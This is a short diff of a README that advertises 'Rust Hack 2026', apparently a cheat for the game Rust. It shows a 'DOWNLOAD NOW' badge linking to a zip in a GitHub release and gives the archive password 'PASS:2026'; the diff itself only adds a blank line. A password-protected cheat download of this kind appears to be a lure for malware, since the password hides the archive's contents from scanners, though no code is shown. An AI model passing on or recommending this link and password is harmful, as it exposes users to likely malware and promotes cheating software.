@@ -65,6 +65,7 @@
 ### 📥 Download
 
 [![Download Rust Hack 2026](https://img.shields.io/badge/DOWNLOAD%20NOW-purple?style=for-the-badge&logo=github)](https://github.com/alexlopezx93y7/rust-internal-2026/releases/download/DOWNLOAD/internal-rust-2026.zip)
+
 **PASS:2026**
 
 ---
